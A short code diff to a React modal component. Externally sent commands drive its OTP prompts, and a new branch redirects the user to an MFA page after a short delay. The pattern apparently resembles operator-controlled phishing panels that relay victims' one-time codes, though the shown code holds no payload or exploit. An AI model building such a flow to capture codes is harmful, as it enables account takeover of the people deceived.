@@ -37,11 +37,14 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
             setIsLoading(false);
             setInvalid(true);
             resetCommand();
-        } else if (command === 'CORRECT_OTP') {
-            console.log("Correct OTP received for:", modal);
+        }  else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
             setIsLoading(false);
-            setIsVerified(true); // Mark as verified
-            resetCommand();
+            setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                resetCommand(); 
+                router.push('/MfaPage');
+            }, 1500);
         } else if (command === 'FINISH') {
             setIsLoading(false);
             setBgLoader(true);
